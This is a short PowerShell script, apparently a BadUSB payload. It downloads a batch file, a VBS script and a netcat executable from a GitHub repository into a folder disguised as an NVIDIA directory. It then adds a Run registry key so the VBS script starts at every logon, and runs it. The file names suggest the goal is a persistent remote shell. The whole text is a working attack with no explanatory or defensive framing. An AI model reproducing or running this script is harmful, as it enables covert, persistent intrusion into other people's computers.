powershell
Invoke-WebRequest -uri 'https://raw.githubusercontent.com/KBT096/badusb_server/master/nc.bat' -OutFile "C:\ProgramData\NVIDIA DATE\nc.bat"
Invoke-WebRequest -uri 'https://raw.githubusercontent.com/KBT096/badusb_server/master/shut.vbs' -OutFile "C:\ProgramData\NVIDIA DATE\shut.vbs"
Invoke-WebRequest -uri 'https://raw.githubusercontent.com/KBT096/badusb_server/master/nc64.exe' -OutFile "C:\ProgramData\NVIDIA DATE\nc64.exe"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "shut"  /t REG_SZ /d "c:\ProgramData\NVIDIA DATE\shut.vbs" /f
"c:\ProgramData\NVIDIA DATE\shut.vbs"
exit
